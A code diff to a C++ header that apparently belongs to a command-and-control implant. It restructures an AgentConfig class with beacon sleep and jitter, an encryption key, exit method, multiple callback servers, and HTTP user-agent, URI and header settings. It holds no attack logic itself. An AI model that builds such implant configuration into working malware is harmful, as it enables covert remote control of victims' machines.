@@ -7,27 +7,27 @@ class AgentConfig
 public:
 	BOOL active;
 
-	DWORD agent_type;
+	ULONG agent_type;
+	BYTE* encrypt_key;
+	ULONG sleep_delay;
+	ULONG jitter_delay;
+
 	BYTE  exit_method;
 	ULONG exit_task_id;
-	DWORD download_chunk_size;
-	PBYTE encrypt_key;
-	DWORD sleep_delay;
-	DWORD jitter_delay;
+	ULONG download_chunk_size;
 
 	// HTTP Config
-	PBYTE user_agent;
-	BOOL  use_ssl;
-	WORD  port;
-	PBYTE address;
-	DWORD ans_pre_offset;
-	DWORD ans_post_offset;
-	PBYTE param_name;
-	PBYTE method;
-	PBYTE uri;
-	PBYTE headers;
+	WORD   port;
+	ULONG  servers_count;
+	BYTE** servers;
+	BOOL   use_ssl;
+	BYTE*  http_method;
+	BYTE*  uri;
+	BYTE*  parameter;
+	BYTE*  user_agent;
+	BYTE*  http_headers;
+	ULONG  ans_pre_size;
+	ULONG  ans_post_size;
 
 	AgentConfig();
-
-	void LoadConfig(BYTE* config);
 };
